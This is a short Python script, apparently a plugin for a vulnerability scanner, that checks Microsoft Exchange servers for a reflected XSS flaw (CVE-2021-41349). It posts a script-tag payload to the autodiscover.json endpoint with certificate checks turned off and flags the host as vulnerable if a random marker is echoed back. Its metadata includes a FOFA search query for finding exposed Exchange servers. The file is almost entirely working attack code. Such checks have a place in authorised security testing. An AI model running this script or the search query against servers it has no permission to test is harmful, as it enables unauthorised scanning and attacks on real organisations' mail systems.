#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/serverapp/Microsoft Exchange/Microsoft Exchange autodiscover.json 反射型XSS CVE-2021-41349.html',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Microsoft Exchange autodiscover.json 反射型XSS CVE-2021-41349',

      'level'     :   'low',

      'FOFA'      :   'icon_hash="1768726119"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(15)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/autodiscover/autodiscover.json'
  data = f"""<script>alert({r0});+="</script>"""
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if r0 in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret